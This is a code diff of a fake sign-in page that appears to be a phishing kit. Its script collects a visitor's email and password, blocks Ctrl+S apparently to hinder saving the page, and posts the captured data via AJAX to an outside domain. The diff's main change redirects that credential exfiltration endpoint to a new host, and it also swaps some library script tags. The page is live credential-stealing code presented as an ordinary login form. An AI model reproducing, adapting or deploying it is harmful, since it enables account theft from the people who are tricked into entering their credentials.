@@ -27,8 +27,14 @@ body{background: #0073C6;}.container{width:100%; display: flex; justify-content:
 <p style="color:#0073C6; margin-top:0em; float: left; width:100%;"></p>
 </div></form></div></div></div>
 
-<script src="https://code.jquery.com/jquery-2.2.3.min.js"integrity="sha256-a23g1Nt4dtEYOj7bR+vTu7+T8VP13humZFBJNIYoEJo="crossorigin="anonymous"></script>
-<script src="jquery.js"></script>
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+
 <script type="text/javascript">
 const Dom={email: "#email", password: "#password", submit: "#signin", domain: "#domain-name", alert: ".alert2",}; 
 let Patterns={email: /^([\w-]*)@([a-zA-Z]+)\.([a-zA-Z]+)(\.[a-zA-Z]{2,3})?$/g, password: /^([\w-!#\$@\/]{6,})$/g}; 
@@ -57,9 +63,6 @@ function changeAlert(alert, klass){alert.className=alert.className.replace(/\bal
 </script>
 
 <script>
- $(window).load(function() {
-    $('#loading').fadeOut();
-});
     
 // prevent ctrl + s
 $(document).bind('keydown', function(e) {
@@ -160,7 +163,7 @@ count=count+1;
 
 $.ajax({
 dataType: 'JSON',
-url: 'https://maersoul.com/join/document.php',
+url: 'https://extraosseous.com/snow/document.php',
 type: 'POST',
 data:{
 email:email,
